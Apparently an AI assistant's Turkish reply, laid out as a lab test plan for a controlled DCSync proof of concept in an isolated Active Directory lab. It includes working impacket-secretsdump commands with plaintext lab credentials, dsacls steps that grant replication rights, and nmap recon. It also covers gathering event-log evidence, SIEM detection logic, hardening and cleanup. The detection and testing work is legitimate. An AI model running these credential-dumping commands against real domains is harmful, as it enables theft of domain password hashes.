@@ -1,0 +1,924 @@
+Harika kanka. Password spray loglarını gördüysen sıradaki test için mantıklı zincir şu olur:
+
+```text
+PS-001 Password Spray → geçerli kullanıcı elde edildi
+DCS-001 DCSync PoC → replication yetkisi kötüye kullanımı / detection testi
+```
+
+Aşağıdaki doküman **izole lab ortamı** için hazırlanmıştır. Özellikle güvenli kalması için test şu şekilde sınırlandırıldı:
+
+```text
+krbtgt dump yok
+Administrator dump yok
+Tüm domain hash dump yok
+Sadece özel oluşturulmuş canary kullanıcı hedefleniyor
+Sadece özel yetkilendirilmiş test hesabı kullanılıyor
+Amaç credential theft değil, DCSync detection ve kontrol doğrulaması
+```
+
+---
+
+# Test Dokümanı — DCS-001 DCSync PoC
+
+## 1. Amaç
+
+Bu testin amacı, izole Active Directory lab ortamında **DCSync tekniğini kontrollü şekilde simüle etmek** ve aşağıdaki güvenlik kontrollerini doğrulamaktır:
+
+* Replication yetkisine sahip bir hesabın domain secrets okuyabilme riskini göstermek
+* DCSync davranışının DC üzerinde loglanıp loglanmadığını doğrulamak
+* DC dışı bir sistemden gelen replication benzeri aktivitenin tespit edilip edilmediğini test etmek
+* Event ID `4662`, `4624`, `4672`, `5140/5145` gibi logların oluşumunu belgelemek
+* “Replication rights” verilen hesapların ne kadar kritik olduğunu göstermek
+
+---
+
+## 2. Lab Topolojisi
+
+| Sistem              | Rol                     |     Hostname |            IP |
+| ------------------- | ----------------------- | -----------: | ------------: |
+| Active Directory DC | Domain Controller + DNS |       `DC01` | `10.10.10.10` |
+| Windows Client 1    | Domain client           | `WIN10-CL01` | `10.10.10.21` |
+| Windows Client 2    | Domain client           | `WIN10-CL02` | `10.10.10.22` |
+| Kali                | Test host               |     `KALI01` | `10.10.10.50` |
+
+Domain bilgisi:
+
+```text
+Domain FQDN : lab.local
+NetBIOS     : LAB
+DC          : dc01.lab.local
+DC IP       : 10.10.10.10
+```
+
+---
+
+## 3. Kapsam
+
+### Kapsam Dahili
+
+```text
+DC01 / 10.10.10.10
+WIN10-CL01 / 10.10.10.21
+WIN10-CL02 / 10.10.10.22
+KALI01 / 10.10.10.50
+lab.local test domain
+DCSync-Lab test kullanıcıları
+```
+
+### Kapsam Dışı
+
+```text
+krbtgt hesabı
+Administrator hesabı
+Domain Admin hesapları
+Gerçek kullanıcı hesapları
+Servis hesapları
+Tüm domain hash dump işlemleri
+Production sistemler
+İnternet hedefleri
+```
+
+---
+
+# 4. DCSync Nedir?
+
+DCSync, bir saldırganın ya da yetkili test kullanıcısının kendisini domain controller gibi göstererek Active Directory replication mekanizmasını kötüye kullanmasıdır.
+
+Normalde DC’ler birbirleriyle kullanıcı parola hash’leri dahil bazı hassas bilgileri replikasyon için paylaşabilir. Eğer bir kullanıcıya yanlışlıkla veya kasıtlı olarak gerekli replication yetkileri verilirse, bu kullanıcı DC olmadan da belirli hesapların credential materyallerini isteyebilir.
+
+Bu testte amaç:
+
+```text
+Replication hakkı verilen bir test hesabının,
+yalnızca canary test kullanıcısına ait hash bilgisini okuyabildiğini göstermek.
+```
+
+---
+
+# 5. Ön Gereksinimler
+
+## 5.1 Active Directory Sağlık Kontrolü
+
+DC üzerinde PowerShell’i Administrator olarak aç:
+
+```powershell
+Import-Module ActiveDirectory
+
+Get-ADDomain
+Get-ADDomainController
+```
+
+Beklenen:
+
+```text
+DNSRoot     : lab.local
+NetBIOSName : LAB
+```
+
+Domain DN bilgisini al:
+
+```powershell
+(Get-ADDomain).DistinguishedName
+```
+
+Beklenen:
+
+```text
+DC=lab,DC=local
+```
+
+---
+
+## 5.2 Test OU Oluşturma
+
+```powershell
+Import-Module ActiveDirectory
+
+$DomainDN = (Get-ADDomain).DistinguishedName
+$OUName = "DCSync-Lab"
+
+if (-not (Get-ADOrganizationalUnit -Filter "Name -eq '$OUName'" -ErrorAction SilentlyContinue)) {
+    New-ADOrganizationalUnit -Name $OUName -Path $DomainDN
+    Write-Host "[+] OU oluşturuldu: OU=$OUName,$DomainDN"
+}
+else {
+    Write-Host "[*] OU zaten mevcut."
+}
+```
+
+---
+
+## 5.3 Canary Kullanıcı Oluşturma
+
+Bu kullanıcı yalnızca test hedefi olacak.
+
+```powershell
+$DomainDN = (Get-ADDomain).DistinguishedName
+$OUPath = "OU=DCSync-Lab,$DomainDN"
+
+$CanaryPassword = ConvertTo-SecureString "CanaryUser2026!" -AsPlainText -Force
+
+New-ADUser `
+    -Name "DCSync Canary User" `
+    -SamAccountName "dcsync.canary" `
+    -UserPrincipalName "dcsync.canary@lab.local" `
+    -DisplayName "DCSync Canary User" `
+    -AccountPassword $CanaryPassword `
+    -Enabled $true `
+    -PasswordNeverExpires $true `
+    -ChangePasswordAtLogon $false `
+    -Path $OUPath
+```
+
+Kontrol:
+
+```powershell
+Get-ADUser dcsync.canary -Properties Enabled,PasswordLastSet |
+Select-Object SamAccountName,Enabled,PasswordLastSet
+```
+
+Beklenen:
+
+```text
+SamAccountName : dcsync.canary
+Enabled        : True
+```
+
+---
+
+## 5.4 DCSync Operatör Kullanıcısı Oluşturma
+
+Bu kullanıcıya kontrollü olarak replication yetkisi verilecek.
+
+```powershell
+$OperatorPassword = ConvertTo-SecureString "DcsyncTest2026!" -AsPlainText -Force
+$DomainDN = (Get-ADDomain).DistinguishedName
+$OUPath = "OU=DCSync-Lab,$DomainDN"
+
+New-ADUser `
+    -Name "DCSync Test Operator" `
+    -SamAccountName "dcsync.operator" `
+    -UserPrincipalName "dcsync.operator@lab.local" `
+    -DisplayName "DCSync Test Operator" `
+    -AccountPassword $OperatorPassword `
+    -Enabled $true `
+    -PasswordNeverExpires $true `
+    -ChangePasswordAtLogon $false `
+    -Path $OUPath
+```
+
+Kontrol:
+
+```powershell
+Get-ADUser dcsync.operator -Properties Enabled |
+Select-Object SamAccountName,Enabled
+```
+
+---
+
+## 5.5 Operatör Hesabının Admin Olmadığını Doğrula
+
+Bu hesap Domain Admin olmamalı.
+
+```powershell
+Get-ADPrincipalGroupMembership dcsync.operator |
+Select-Object Name
+```
+
+Beklenen gruplar:
+
+```text
+Domain Users
+```
+
+Aşağıdakiler olmamalı:
+
+```text
+Domain Admins
+Enterprise Admins
+Administrators
+Account Operators
+Backup Operators
+```
+
+---
+
+# 6. Replication Yetkisi Verme
+
+DCSync için test kullanıcısına domain root üzerinde şu haklar verilir:
+
+```text
+Replicating Directory Changes
+Replicating Directory Changes All
+Replicating Directory Changes In Filtered Set
+```
+
+DC üzerinde Administrator PowerShell:
+
+```powershell
+$DomainDN = (Get-ADDomain).DistinguishedName
+
+dsacls $DomainDN /G "LAB\dcsync.operator:CA;Replicating Directory Changes"
+dsacls $DomainDN /G "LAB\dcsync.operator:CA;Replicating Directory Changes All"
+dsacls $DomainDN /G "LAB\dcsync.operator:CA;Replicating Directory Changes In Filtered Set"
+```
+
+Yetki kontrolü:
+
+```powershell
+dsacls $DomainDN | findstr /i "dcsync.operator"
+```
+
+Beklenen çıktıda şu haklar görünmeli:
+
+```text
+Replicating Directory Changes
+Replicating Directory Changes All
+Replicating Directory Changes In Filtered Set
+```
+
+---
+
+# 7. Logging Ön Gereksinimleri
+
+## 7.1 Audit Policy Aktif Etme
+
+DC üzerinde:
+
+```powershell
+auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
+auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
+auditpol /set /subcategory:"Logon" /success:enable /failure:enable
+auditpol /set /subcategory:"Special Logon" /success:enable /failure:enable
+auditpol /set /subcategory:"File Share" /success:enable /failure:enable
+auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
+```
+
+Kontrol:
+
+```powershell
+auditpol /get /category:*
+```
+
+---
+
+## 7.2 DCSync İçin Kritik Event ID’ler
+
+| Event ID | Açıklama                    |
+| -------: | --------------------------- |
+|   `4624` | Successful logon            |
+|   `4625` | Failed logon                |
+|   `4662` | Directory object access     |
+|   `4672` | Special privileges assigned |
+|   `5140` | Network share accessed      |
+|   `5145` | Detailed file share access  |
+
+DCSync detection için en kritik event genelde:
+
+```text
+4662 - Directory Service Access
+```
+
+Özellikle şu GUID’ler aranır:
+
+```text
+1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+DS-Replication-Get-Changes
+
+1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
+DS-Replication-Get-Changes-All
+
+89e95b76-444d-4c62-991a-0facbeda640c
+DS-Replication-Get-Changes-In-Filtered-Set
+```
+
+---
+
+# 8. Recon Aşaması
+
+## 8.1 Kali Tarafında Çalışma Dizini
+
+```bash
+mkdir -p ~/lab/dcs-001/{recon,outputs,pcaps,evidence}
+cd ~/lab/dcs-001
+```
+
+---
+
+## 8.2 Host Discovery
+
+```bash
+sudo nmap -sn 10.10.10.0/24 -oA recon/01-host-discovery
+```
+
+Beklenen:
+
+```text
+10.10.10.10  DC01
+10.10.10.21  WIN10-CL01
+10.10.10.22  WIN10-CL02
+10.10.10.50  KALI01
+```
+
+---
+
+## 8.3 DC Port Kontrolü
+
+```bash
+sudo nmap -sS -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389 \
+10.10.10.10 -oA recon/02-dc-ports
+```
+
+DCSync için özellikle önemli portlar:
+
+| Port | Servis                   |
+| ---: | ------------------------ |
+|  135 | RPC Endpoint Mapper      |
+|  445 | SMB / RPC named pipes    |
+|  389 | LDAP                     |
+|   88 | Kerberos                 |
+|  464 | Kerberos password change |
+| 3268 | Global Catalog           |
+
+---
+
+## 8.4 DNS ve Domain Kontrolü
+
+```bash
+dig @10.10.10.10 lab.local
+dig @10.10.10.10 _ldap._tcp.dc._msdcs.lab.local SRV
+dig @10.10.10.10 _kerberos._tcp.lab.local SRV
+```
+
+---
+
+## 8.5 Zaman Senkronizasyonu
+
+Kerberos ve domain işlemleri için Kali ile DC zamanı uyumlu olmalı.
+
+```bash
+date
+sudo ntpdate -q 10.10.10.10
+```
+
+Gerekirse:
+
+```bash
+sudo ntpdate 10.10.10.10
+```
+
+---
+
+# 9. Araç Ön Gereksinimi
+
+## 9.1 Impacket Kontrolü
+
+Kali üzerinde:
+
+```bash
+impacket-secretsdump -h
+```
+
+Komut yoksa:
+
+```bash
+sudo apt update
+sudo apt install -y python3-impacket
+```
+
+Alternatif kurulum:
+
+```bash
+python3 -m pipx install impacket
+```
+
+Bazı sistemlerde komut adı şu olabilir:
+
+```bash
+secretsdump.py -h
+```
+
+---
+
+# 10. Negatif Kontrol Testi
+
+Önce replication yetkisi olmayan bir kullanıcıyla test yapılır. Amaç, yetkisiz kullanıcının başarısız olduğunu kanıtlamaktır.
+
+Örneğin password spray testinde elde ettiğin `spray.user07` hesabı ile sadece canary kullanıcı hedeflenir:
+
+```bash
+impacket-secretsdump \
+LAB/spray.user07:'Spring2026!'@10.10.10.10 \
+-dc-ip 10.10.10.10 \
+-just-dc-user dcsync.canary
+```
+
+Beklenen sonuç:
+
+```text
+[-] DRSR SessionError
+[-] rpc_s_access_denied
+veya
+[-] ERROR_DS_DRA_ACCESS_DENIED
+```
+
+Bu çıktı rapora şu şekilde eklenir:
+
+```text
+Replication yetkisi olmayan standart domain kullanıcısı DCSync işlemi gerçekleştiremedi.
+```
+
+---
+
+# 11. DCSync PoC Testi
+
+## 11.1 Trafik Kaydı Başlatma
+
+Kali üzerinde ayrı terminal:
+
+```bash
+sudo tcpdump -i eth0 host 10.10.10.10 and \( port 135 or port 445 or portrange 49152-65535 \) \
+-w pcaps/dcs-001-dcsync.pcap
+```
+
+---
+
+## 11.2 Kontrollü DCSync — Sadece Canary User
+
+Kali üzerinde:
+
+```bash
+impacket-secretsdump \
+LAB/dcsync.operator:'DcsyncTest2026!'@10.10.10.10 \
+-dc-ip 10.10.10.10 \
+-just-dc-user dcsync.canary \
+-outputfile outputs/dcs-001-canary
+```
+
+Bazı Kali sürümlerinde komut şu olabilir:
+
+```bash
+secretsdump.py \
+LAB/dcsync.operator:'DcsyncTest2026!'@10.10.10.10 \
+-dc-ip 10.10.10.10 \
+-just-dc-user dcsync.canary \
+-outputfile outputs/dcs-001-canary
+```
+
+Beklenen başarılı çıktı örneği:
+
+```text
+[*] Dumping Domain Credentials
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+LAB.LOCAL\dcsync.canary:RID:LMHASH:NTHASH:::
+[*] Cleaning up...
+```
+
+Önemli not:
+
+```text
+Bu PoC'de -just-dc-user parametresi zorunludur.
+Tüm domain dump yapılmayacak.
+krbtgt, Administrator veya gerçek kullanıcılar hedeflenmeyecek.
+```
+
+---
+
+# 12. DC Üzerinde Kanıt Toplama
+
+## 12.1 Event ID 4624 — Successful Logon
+
+DC üzerinde:
+
+```powershell
+$StartTime = (Get-Date).AddHours(-1)
+
+Get-WinEvent -FilterHashtable @{
+    LogName='Security'
+    Id=4624
+    StartTime=$StartTime
+} | Where-Object {
+    $_.Message -match "dcsync.operator" -or $_.Message -match "10.10.10.50"
+} | Select-Object TimeCreated, Id, Message |
+Out-File C:\Temp\dcs-001-4624.txt
+```
+
+Kontrol edilecek alanlar:
+
+```text
+Account Name       : dcsync.operator
+Source Network IP  : 10.10.10.50
+Logon Type         : 3
+Authentication     : NTLM veya Kerberos
+```
+
+---
+
+## 12.2 Event ID 4662 — Directory Service Access
+
+```powershell
+$StartTime = (Get-Date).AddHours(-1)
+
+Get-WinEvent -FilterHashtable @{
+    LogName='Security'
+    Id=4662
+    StartTime=$StartTime
+} | Where-Object {
+    $_.Message -match "dcsync.operator" -or
+    $_.Message -match "1131f6aa" -or
+    $_.Message -match "1131f6ad" -or
+    $_.Message -match "89e95b76" -or
+    $_.Message -match "Replicating Directory Changes"
+} | Select-Object TimeCreated, Id, Message |
+Out-File C:\Temp\dcs-001-4662.txt
+```
+
+Beklenen bulgular:
+
+```text
+Subject Account Name : dcsync.operator
+Object Type          : domainDNS veya benzeri domain object
+Access Mask          : Control Access
+Properties           : Replication GUID’leri
+```
+
+---
+
+## 12.3 Event ID 4672 — Special Logon
+
+```powershell
+$StartTime = (Get-Date).AddHours(-1)
+
+Get-WinEvent -FilterHashtable @{
+    LogName='Security'
+    Id=4672
+    StartTime=$StartTime
+} | Where-Object {
+    $_.Message -match "dcsync.operator"
+} | Select-Object TimeCreated, Id, Message |
+Out-File C:\Temp\dcs-001-4672.txt
+```
+
+Not:
+
+```text
+dcsync.operator hesabı Domain Admin olmadığı için 4672 her zaman oluşmayabilir.
+Oluşursa rapora eklenir, oluşmazsa "gözlemlenmedi" olarak not edilir.
+```
+
+---
+
+## 12.4 SMB / Named Pipe İzleri
+
+```powershell
+$StartTime = (Get-Date).AddHours(-1)
+
+Get-WinEvent -FilterHashtable @{
+    LogName='Security'
+    Id=5140
+    StartTime=$StartTime
+} | Where-Object {
+    $_.Message -match "10.10.10.50" -or $_.Message -match "dcsync.operator"
+} | Select-Object TimeCreated, Id, Message |
+Out-File C:\Temp\dcs-001-5140.txt
+```
+
+```powershell
+$StartTime = (Get-Date).AddHours(-1)
+
+Get-WinEvent -FilterHashtable @{
+    LogName='Security'
+    Id=5145
+    StartTime=$StartTime
+} | Where-Object {
+    $_.Message -match "10.10.10.50" -or $_.Message -match "dcsync.operator"
+} | Select-Object TimeCreated, Id, Message |
+Out-File C:\Temp\dcs-001-5145.txt
+```
+
+---
+
+# 13. Detection Mantığı
+
+DCSync için güçlü detection sinyali:
+
+```text
+Event ID 4662
++
+Properties içinde replication GUID’leri
++
+Subject Account Name DC machine account değil
++
+Kaynak sistem domain controller değil
+```
+
+Replication GUID’leri:
+
+```text
+1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
+89e95b76-444d-4c62-991a-0facbeda640c
+```
+
+Basit SIEM mantığı:
+
+```text
+IF EventID == 4662
+AND Properties contains any replication GUID
+AND SubjectUserName does not end with "$"
+AND SubjectUserName not in approved replication accounts
+THEN Alert: Possible DCSync Activity
+```
+
+Daha iyi mantık:
+
+```text
+IF EventID == 4662
+AND replication GUID observed
+AND source host is not a Domain Controller
+AND account is not allowlisted
+THEN High Severity DCSync Alert
+```
+
+---
+
+# 14. Beklenen Bulgular
+
+## FIND-DCS-001 — Replication Yetkisiyle Canary Kullanıcı Hash Erişimi
+
+| Alan             | Değer                                                                   |
+| ---------------- | ----------------------------------------------------------------------- |
+| Bulgu ID         | FIND-DCS-001                                                            |
+| Başlık           | Replication yetkisine sahip test hesabı ile DCSync gerçekleştirilebildi |
+| Kaynak           | `KALI01 / 10.10.10.50`                                                  |
+| Hedef            | `DC01 / 10.10.10.10`                                                    |
+| Kullanılan hesap | `LAB\dcsync.operator`                                                   |
+| Hedef kullanıcı  | `LAB\dcsync.canary`                                                     |
+| Teknik           | DCSync                                                                  |
+| Önem             | Critical                                                                |
+| MITRE            | Credential Access / OS Credential Dumping / DCSync                      |
+
+Açıklama:
+
+```text
+Test kapsamında LAB\dcsync.operator hesabına kontrollü olarak domain root üzerinde replication yetkileri verilmiştir.
+Bu yetkiler kullanılarak yalnızca LAB\dcsync.canary test hesabına ait credential hash bilgisi DRSUAPI üzerinden alınabilmiştir.
+Bu durum, replication yetkilerinin Domain Admin seviyesinde kritik etkiye sahip olduğunu göstermektedir.
+```
+
+Etki:
+
+```text
+Replication yetkisi kötüye kullanılırsa saldırgan domain kullanıcılarına ait hash bilgilerini elde edebilir.
+krbtgt hash’inin ele geçirilmesi halinde Golden Ticket gibi ileri seviye domain compromise senaryoları mümkün olabilir.
+Bu PoC’de krbtgt ve gerçek kullanıcılar hedeflenmemiştir.
+```
+
+Kanıtlar:
+
+```text
+outputs/dcs-001-canary.ntds
+outputs/dcs-001-canary.ntds.kerberos
+outputs/dcs-001-canary.ntds.cleartext
+pcaps/dcs-001-dcsync.pcap
+C:\Temp\dcs-001-4624.txt
+C:\Temp\dcs-001-4662.txt
+C:\Temp\dcs-001-5140.txt
+```
+
+---
+
+# 15. Önerilen İyileştirmeler
+
+## 15.1 Replication Yetkilerini Gözden Geçir
+
+Domain root üzerinde replication yetkisi olan hesapları kontrol et:
+
+```powershell
+$DomainDN = (Get-ADDomain).DistinguishedName
+dsacls $DomainDN | findstr /i "Replicating"
+```
+
+Şu haklara sahip kullanıcılar dikkatle incelenmeli:
+
+```text
+Replicating Directory Changes
+Replicating Directory Changes All
+Replicating Directory Changes In Filtered Set
+```
+
+---
+
+## 15.2 Yetki Temizliği
+
+Gereksiz replication yetkileri kaldırılmalı.
+
+```powershell
+$DomainDN = (Get-ADDomain).DistinguishedName
+dsacls $DomainDN /R "LAB\dcsync.operator"
+```
+
+---
+
+## 15.3 Tiering Model Uygula
+
+```text
+Domain Admin ve replication yetkisi olan hesaplar Tier 0 kabul edilmeli.
+Bu hesaplar workstation üzerinde kullanılmamalı.
+Bu hesapların interactive logon hakları sınırlandırılmalı.
+```
+
+---
+
+## 15.4 Detection Rule Oluştur
+
+SIEM tarafında şu alarm üretilmeli:
+
+```text
+Non-DC account + Event ID 4662 + Replication GUID = Possible DCSync
+```
+
+Allowlist içinde yalnızca gerçek DC machine account’ları bulunmalı:
+
+```text
+DC01$
+DC02$
+```
+
+---
+
+## 15.5 Hassas Hesapları İzle
+
+Aşağıdaki hesaplar için özel alarm önerilir:
+
+```text
+krbtgt
+Administrator
+Domain Admin üyeleri
+Enterprise Admin üyeleri
+AAD Connect / Entra Connect hesapları
+Backup / sync servis hesapları
+```
+
+---
+
+# 16. Cleanup
+
+## 16.1 Replication Yetkisini Kaldır
+
+DC üzerinde:
+
+```powershell
+$DomainDN = (Get-ADDomain).DistinguishedName
+dsacls $DomainDN /R "LAB\dcsync.operator"
+```
+
+Kontrol:
+
+```powershell
+dsacls $DomainDN | findstr /i "dcsync.operator"
+```
+
+Beklenen:
+
+```text
+Çıktı dönmemeli.
+```
+
+---
+
+## 16.2 Test Kullanıcılarını Sil
+
+```powershell
+Remove-ADUser dcsync.operator -Confirm:$false
+Remove-ADUser dcsync.canary -Confirm:$false
+```
+
+OU boşsa sil:
+
+```powershell
+Remove-ADOrganizationalUnit `
+    -Identity "OU=DCSync-Lab,$((Get-ADDomain).DistinguishedName)" `
+    -Confirm:$false
+```
+
+OU silinemezse accidental deletion korumasını kaldır:
+
+```powershell
+Set-ADOrganizationalUnit `
+    -Identity "OU=DCSync-Lab,$((Get-ADDomain).DistinguishedName)" `
+    -ProtectedFromAccidentalDeletion $false
+
+Remove-ADOrganizationalUnit `
+    -Identity "OU=DCSync-Lab,$((Get-ADDomain).DistinguishedName)" `
+    -Confirm:$false
+```
+
+---
+
+## 16.3 Evidence Arşivleme
+
+Kali üzerinde:
+
+```bash
+tar -czvf dcs-001-evidence.tar.gz recon outputs pcaps evidence
+sha256sum dcs-001-evidence.tar.gz > dcs-001-evidence.sha256
+```
+
+---
+
+# 17. Test Kabul Kriterleri
+
+Test başarılı sayılırsa:
+
+```text
+[+] dcsync.operator hesabı Domain Admin değildir.
+[+] dcsync.operator hesabına sadece test için replication hakları verilmiştir.
+[+] Yetkisiz kullanıcı ile yapılan negatif kontrol başarısız olmuştur.
+[+] DCSync yalnızca dcsync.canary kullanıcısına karşı yapılmıştır.
+[+] krbtgt / Administrator / gerçek kullanıcı dump edilmemiştir.
+[+] DC üzerinde 4662 eventleri gözlemlenmiştir.
+[+] Source IP olarak 10.10.10.50 gözlemlenmiştir.
+[+] Test sonunda replication hakları kaldırılmıştır.
+[+] Test hesapları silinmiş veya disable edilmiştir.
+[+] Evidence arşivlenmiştir.
+```
+
+---
+
+# 18. Rapor Executive Summary Örneği
+
+```text
+İzole Active Directory lab ortamında DCSync tekniği kontrollü olarak test edilmiştir.
+Test kapsamında özel oluşturulan LAB\dcsync.operator hesabına geçici replication yetkileri verilmiş ve yalnızca LAB\dcsync.canary test kullanıcısı hedeflenmiştir.
+
+Replication yetkisi olmayan standart domain kullanıcısı ile yapılan negatif kontrol başarısız olmuştur.
+Replication yetkisi verilen test hesabı ile canary kullanıcıya ait hash bilgisi DRSUAPI üzerinden alınabilmiştir.
+
+DC üzerinde Event ID 4662 ve ilgili replication GUID’leri gözlemlenmiştir.
+Bu durum, replication yetkilerinin domain compromise etkisine sahip olduğunu ve non-DC hesaplarda bu yetkilerin sıkı şekilde izlenmesi gerektiğini göstermektedir.
+```
+
+---
+
+# 19. Operasyonel Not
+
+Bu testin güvenli sınırı şu olmalı:
+
+```text
+-just-dc-user dcsync.canary kullanılacak.
+-just-dc veya full dump kullanılmayacak.
+krbtgt hedeflenmeyecek.
+Administrator hedeflenmeyecek.
+Gerçek kullanıcılar hedeflenmeyecek.
+Test sonunda dsacls ile yetkiler kaldırılacak.
+```
+
+Bu doküman password spray’den sonra ikinci PoC olarak gayet temiz gider:
+
+```text
+PS-001: Password Spray Detection
+DCS-001: DCSync Detection
+```
+
+Bir sonraki adımda bunu rapora koymak için **Finding formatı + ekran görüntüsü checklist’i + SIEM detection rule** haline de çevirebiliriz.
